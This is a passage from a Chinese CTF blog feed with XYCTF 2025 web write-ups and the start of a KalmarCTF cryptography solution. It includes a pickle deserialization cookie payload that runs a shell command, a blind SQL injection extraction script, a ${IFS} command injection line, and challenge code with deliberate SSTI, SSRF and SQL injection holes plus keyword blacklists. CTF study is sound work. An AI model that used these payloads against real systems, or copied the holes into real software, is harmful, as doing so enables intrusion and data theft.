).digest()</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&quot;!&#x27;</span> + signature + <span class="string">b&quot;?&quot;</span> + b64pld + <span class="string">b&#x27;&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;cat /flag_* &gt; flag&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(gen_cookie(data).decode())</span><br></pre></td></tr></table></figure><p>然后通过<code>/download?filename=flag</code>路由进行下载即可<br><code>XYCTF&#123;We1c0me_t0_XYCTF_2o25!The_secret_1s_L@men7XU_L0v3_u!&#125;</code></p><h2 id="ezsql-手动滑稽"><a href="#ezsql-手动滑稽" class="headerlink" title="ezsql(手动滑稽)"></a>ezsql(手动滑稽)</h2><blockquote><p>简单sql(手动滑稽)，不需要sqlmap等自动化工具，请手工哟∧_∧</p></blockquote><p><code>username</code>单引号注入报错，确定为注入点，也可以看出是<code>sqlite</code></p><p><code>fuzz</code>一下发现<strong>空格</strong>、<strong>+-*|</strong>、<strong>换行符</strong>、<strong>逗号</strong>，<strong>union</strong>等被过滤了<br>找到<a href="https://github.com/BaizeSec/bylibrary/blob/main/docs/%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8.md">绕过参考</a><br>先试试<strong>万能密码</strong>能不能直接登陆，发现是可以的<br><img src="https://pic1.zhimg.com/80/v2-5f9a7fd715f0bf17e95307805b462dc1_1440w.png" alt=""><br>这里尝试<strong>盲注</strong>能不能注出<strong>秘钥</strong></p><p><strong>空格</strong>可以用<code>%09</code>即<code>tap</code>代替，<strong>逗号</strong>用<code>from for</code></p><p>改一下以前的<strong>布尔盲注</strong>脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;xxx/login.php&#x27;</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    head = <span class="number">1</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&quot;1&#x27; or ascii(substr(database() from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span></span><br><span class="line">        <span class="comment"># testdb</span></span><br><span class="line">        <span class="comment"># payload = f&quot;1&#x27; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span></span><br><span class="line">        <span class="comment"># double_check,user</span></span><br><span class="line">        <span class="comment"># payload = f&quot;1&#x27; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;double_check&#x27;) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span></span><br><span class="line">        <span class="comment"># secret</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27; or ascii(substr((select group_concat(secret) from double_check) from <span class="subst">&#123;i&#125;</span> for <span class="subst">&#123;i&#125;</span>)) &gt; <span class="subst">&#123;mid&#125;</span>#&quot;</span></span><br><span class="line">        <span class="comment"># dtfrtkcc0czkoua9S</span></span><br><span class="line">        <span class="comment"># param = &quot;id&quot; + payload</span></span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: payload.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;\t&quot;</span>),</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line">        <span class="comment"># r = requests.get(url, params=param)</span></span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;帐号或密码错误&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">1</span>:</span><br><span class="line">        text += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>输入秘钥后，告诉我们<strong>命令执行无回显</strong>，又过滤了<strong>空格</strong>，简单，直接重定向<br><code>command=cat$&#123;IFS&#125;/flag.txt$&#123;IFS&#125;&gt;1.txt</code></p><h2 id="ez-puzzle"><a href="#ez-puzzle" class="headerlink" title="ez_puzzle"></a>ez_puzzle</h2><blockquote><p>你能在两秒之内完成拼图吗？</p></blockquote><p>可以搜索前端<code>js</code>脚本，因为本题的关键肯定是在时间，所以搜一下<code>time</code>，发现了<code>startTime endTime</code></p><p>完成拼图后通过侧边栏进入<strong>开发者工具</strong>，正常来说花费的时间应该是<code>endTime-startTime</code>，控制台只能查看<code>startTime</code>，说明我们只能通过完成拼图那一刻才能得到<code>endTime</code>，也就是前端页面的<strong>实时时间</strong></p><p>所以我们可以在控制台输入<code>startTime=Date.now()</code>，从而使花费的时间为0<br><img src="https://picx.zhimg.com/80/v2-9ed42b3fccc199b8c329f4f661b7b195_1440w.png" alt=""><br><img src="https://pic1.zhimg.com/80/v2-0a972282b09fa1c6c3978d67517524ae_1440w.png" alt=""><br><code>flag&#123;Y0u__aRe_a_mAsteR_of_PUzZL!!@!!~!&#125;</code></p><h2 id="fate"><a href="#fate" class="headerlink" title="fate*"></a>fate*</h2><blockquote><p>一生中能改变命运的机会可不多啊。</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">blacklist = string.ascii_letters</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_to_string</span>(<span class="params">binary_string</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary_string) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Binary string length must be a multiple of 8&quot;</span>)</span><br><span class="line">    binary_chunks = [binary_string[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string), <span class="number">8</span>)]</span><br><span class="line">    string_output = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(chunk, <span class="number">2</span>)) <span class="keyword">for</span> chunk <span class="keyword">in</span> binary_chunks)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> string_output</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nolettersproxy</span>():</span><br><span class="line">    url = flask.request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">400</span>, <span class="string">&#x27;No URL provided&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    target_url = <span class="string">&quot;http://lamentxu.top&quot;</span> + url</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;No ssrf allowed&#x27;</span>)</span><br><span class="line">    response = requests.get(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.Response(response.content, response.status_code)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_search</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">with</span> sqlite3.connect(<span class="string">&#x27;database.db&#x27;</span>) <span class="keyword">as</span> conn:</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(<span class="string">f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;<span class="subst">&#123;code&#125;</span>&#x27;)))))))&quot;</span>)</span><br><span class="line">        found = cur.fetchone()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span> <span class="keyword">if</span> found <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(flask.request.remote_addr)</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/1337&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_search</span>():</span><br><span class="line">    <span class="keyword">if</span> flask.request.remote_addr == <span class="string">&#x27;127.0.0.1&#x27;</span>:</span><br><span class="line">        code = flask.request.args.get(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> code == <span class="string">&#x27;abcdefghi&#x27;</span>:</span><br><span class="line">            req = flask.request.args.get(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                req = binary_to_string(req)</span><br><span class="line">                <span class="built_in">print</span>(req)</span><br><span class="line">                req = json.loads(req) <span class="comment"># No one can hack it, right? Pickle unserialize is not secure, but json is ;)</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Invalid JSON&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Empty Person&#x27;s name&quot;</span>)</span><br><span class="line"></span><br><span class="line">            name = req[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">6</span>:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Too long&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;NO &#x27;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;)&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;NO )&quot;</span>)</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Some waf hidden here ;)</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">            fate = db_search(name)</span><br><span class="line">            <span class="keyword">if</span> fate <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                flask.abort(<span class="number">404</span>, <span class="string">&quot;No such Person&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&#x27;Fate&#x27;</span>: fate&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flask.abort(<span class="number">400</span>, <span class="string">&quot;Hello local, and hello hacker&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Only local access allowed&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="Now-you-see-me-1"><a href="#Now-you-see-me-1" class="headerlink" title="Now you see me 1*"></a>Now you see me 1*</h2><blockquote><p><code>&#123;%print("Welcome the four horsemen tonight!")%&#125;</code></p></blockquote><p>先解<code>base64</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># YOU FOUND ME ;)</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   src.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 01:10:37</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">enable_hook =  <span class="literal">False</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_checker</span>(<span class="params">event,args</span>):</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="keyword">if</span> enable_hook:</span><br><span class="line">        <span class="keyword">if</span> event <span class="keyword">in</span> [<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>]:</span><br><span class="line">            counter += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> counter &gt; <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(event)</span><br><span class="line"></span><br><span class="line">lock_within = [</span><br><span class="line">    <span class="string">&quot;debug&quot;</span>, <span class="string">&quot;form&quot;</span>, <span class="string">&quot;args&quot;</span>, <span class="string">&quot;values&quot;</span>, </span><br><span class="line">    <span class="string">&quot;headers&quot;</span>, <span class="string">&quot;json&quot;</span>, <span class="string">&quot;stream&quot;</span>, <span class="string">&quot;environ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;files&quot;</span>, <span class="string">&quot;method&quot;</span>, <span class="string">&quot;cookies&quot;</span>, <span class="string">&quot;application&quot;</span>, </span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;url&#x27;</span> ,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, </span><br><span class="line">    <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>, </span><br><span class="line">    <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>,<span class="string">&quot;self&quot;</span>, </span><br><span class="line">    <span class="string">&quot;lipsum&quot;</span>, <span class="string">&quot;cycler&quot;</span>, <span class="string">&quot;joiner&quot;</span>, <span class="string">&quot;namespace&quot;</span>, </span><br><span class="line">    <span class="string">&quot;init&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;decode&quot;</span>, </span><br><span class="line">    <span class="string">&quot;batch&quot;</span>, <span class="string">&quot;first&quot;</span>, <span class="string">&quot;last&quot;</span> , </span><br><span class="line">    <span class="string">&quot; &quot;</span>,<span class="string">&quot;dict&quot;</span>,<span class="string">&quot;list&quot;</span>,<span class="string">&quot;g.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;g|a&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>, <span class="string">&quot;lower&quot;</span>, <span class="string">&quot;upper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BUILTINS&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;WHOAMI&quot;</span>, <span class="string">&quot;path&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;app&quot;</span>, <span class="string">&quot;setattr&quot;</span>, <span class="string">&quot;translate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;encode&quot;</span>, <span class="string">&quot;\\u&quot;</span>, <span class="string">&quot;pop&quot;</span>, <span class="string">&quot;referer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;The closer you see, the lesser you find.&quot;</span>] </span><br><span class="line">        <span class="comment"># I hate all these.</span></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;try /H3dden_route&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/H3dden_route&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r3al_ins1de_th0ught</span>():</span><br><span class="line">    <span class="keyword">global</span> enable_hook, counter</span><br><span class="line">    name = flask.request.args.get(<span class="string">&#x27;My_ins1de_w0r1d&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> name.startswith(<span class="string">&quot;Follow-your-heart-&quot;</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> lock_within:</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> name:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;NOPE.&#x27;</span></span><br><span class="line">                enable_hook = <span class="literal">True</span></span><br><span class="line">                a = flask.render_template_string(<span class="string">&#x27;&#123;#&#x27;</span>+<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>+<span class="string">&#x27;#&#125;&#x27;</span>)</span><br><span class="line">                enable_hook = <span class="literal">False</span></span><br><span class="line">                counter = <span class="number">0</span></span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;My inside world is always hidden.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">            counter = <span class="number">0</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;NO.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to Hidden_route!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> _posixsubprocess</span><br><span class="line">        <span class="keyword">del</span> _posixsubprocess.fork_exec</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">import</span> subprocess</span><br><span class="line">    <span class="keyword">del</span> os.popen</span><br><span class="line">    <span class="keyword">del</span> os.system</span><br><span class="line">    <span class="keyword">del</span> subprocess.Popen</span><br><span class="line">    <span class="keyword">del</span> subprocess.call</span><br><span class="line">    <span class="keyword">del</span> subprocess.run</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_output</span><br><span class="line">    <span class="keyword">del</span> subprocess.getoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_call</span><br><span class="line">    <span class="keyword">del</span> subprocess.getstatusoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.PIPE</span><br><span class="line">    <span class="keyword">del</span> subprocess.STDOUT</span><br><span class="line">    <span class="keyword">del</span> subprocess.CalledProcessError</span><br><span class="line">    <span class="keyword">del</span> subprocess.TimeoutExpired</span><br><span class="line">    <span class="keyword">del</span> subprocess.SubprocessError</span><br><span class="line">    sys.addaudithook(audit_checker)</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><h2 id="Now-you-see-me-2"><a href="#Now-you-see-me-2" class="headerlink" title="Now you see me 2*"></a>Now you see me 2*</h2><blockquote><p><code>&#123;%print("We are the four horsemen.")%&#125; 压缩包密码为“Now you see me 1”的flag</code></p></blockquote><h2 id="出题人已疯"><a href="#出题人已疯" class="headerlink" title="出题人已疯*"></a>出题人已疯*</h2><blockquote><p>出题人已疯，你知道出题人为什么疯吗</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   app.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 15:52:17</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    payload = bottle.request.query.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload <span class="keyword">and</span> <span class="built_in">len</span>(payload) &lt; <span class="number">25</span> <span class="keyword">and</span> <span class="string">&#x27;open&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload <span class="keyword">and</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload:</span><br><span class="line">        <span class="keyword">return</span> bottle.template(<span class="string">&#x27;hello &#x27;</span>+payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bottle.abort(<span class="number">400</span>, <span class="string">&#x27;Invalid payload&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/LAMENTXU/articles/18805019">出题人</a></p><h2 id="出题人又疯"><a href="#出题人又疯" class="headerlink" title="出题人又疯*"></a>出题人又疯*</h2><blockquote><p>出题人又疯了，你知道这次出题人为什么疯吗？<br>（附件密码是“出题人已疯的flag”）</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;*代表未解决，可能是卡了，也可能是没思路了，简单做个记录，然后跑了，再或者是后续没来得及复现，在此处留个坑，等以后回来填上……&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://gz.imxbt.cn/games/23&quot;&gt;复现网址&lt;/a&gt;&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Cryptography趣题记录</title>
    <link href="https://hvang10.github.io/2025/04/03/%E5%AF%86%E7%A0%81%E8%B6%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://hvang10.github.io/2025/04/03/%E5%AF%86%E7%A0%81%E8%B6%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2025-04-03T06:35:29.000Z</published>
    <updated>2025-09-07T09:46:58.370Z</updated>
    
    <content type="html"><![CDATA[<p>这里也记录一下，各种比赛零零散散的题目(觉得比较有意思的)</p><h1 id="KalmarCTF2025-basic-sums"><a href="#KalmarCTF2025-basic-sums" class="headerlink" title="KalmarCTF2025 - basic sums"></a>KalmarCTF2025 - basic sums</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># I found this super cool function on stack overflow \o/ https://stackoverflow.com/questions/2267362/how-to-convert-an-integer-to-a-string-in-any-base</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">numberToBase</span>(<span class="params">n, b</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">0</span>]</span><br><span class="line">    digits = []</span><br><span class="line">    <span class="keyword">while</span> n:</span><br><span class="line">        digits.append(<span class="built_in">int</span>(n % b))</span><br><span class="line">        n //= b</span><br><span class="line">    <span class="keyword">return</span> digits[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt;= <span class="number">45</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">int</span>.from_bytes(flag, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">base = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Give me a base! &quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> base &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Base is too small&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"><span class="keyword">if</span> base &gt; <span class="number">256</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Base is too big&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Here you go! <span class="subst">&#123;<span class="built_in">sum</span>(numberToBase(flag, base))&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>题目代码非常简单，我们会得到<strong>flag转换为n进制之后的数字之和</strong>，可以写成下面的形式</p><p>$flag=a_{n}b^{n}+a_{n-1}b^{n-1}+a_{n-2}b^{n-2}+…+a_{0}b^{0}$<br>$同时，不难看出有$<br>$flag\equiv sums\equiv a_{n}+a_{n-1}+a_{n-2}+…+a_{1}+a_{1}(mod\ b-1)$<br><img src="https://pic1.zhimg.com/80/v2-e37944dd5555d6ecc347a59f817263ba_1440w.png" alt=""><br>上面是我们选择的进制之间的<strong>最小公倍数</strong>，下面是<strong>flag的近似大小(肯定要比这个大)</strong></p><p>所以，当<strong>模数足够大</strong>的时候，<code>flag</code>模它才能得到本身，同时我们也有</p><p>$flag\equiv sums\ mod\ (b-1)$</p><p>$flag\equiv m\ mod\ lcm(n,b-1)$</p><p>在b不断增大的情况下，<strong>对m不断地进行crt结果的合并</strong>，当最小公倍数增大到<strong>模数大于flag的值</strong>时，我们才能获取到<strong>flag的唯一解</strong></p><p>$flag=crt([m,sums],[lcm(n,b-1),b-1])$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">m = <span class="number">0</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">2</span>,<span class="number">256</span>):</span><br><span class="line">    p = remote(<span class="string">&#x27;basic-sums.chal-kalmarc.tf&#x27;</span>, <span class="number">2256</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Give me a base! &#x27;</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;go! &#x27;</span>)</span><br><span class="line">    m0 = <span class="built_in">int</span>(p.recvline())</span><br><span class="line">    n0 = i-<span class="number">1</span></span><br><span class="line">    m = crt([m,m0],[n,n0])</span><br><span class="line">    n = lcm(n,n0)</span><br><span class="line">    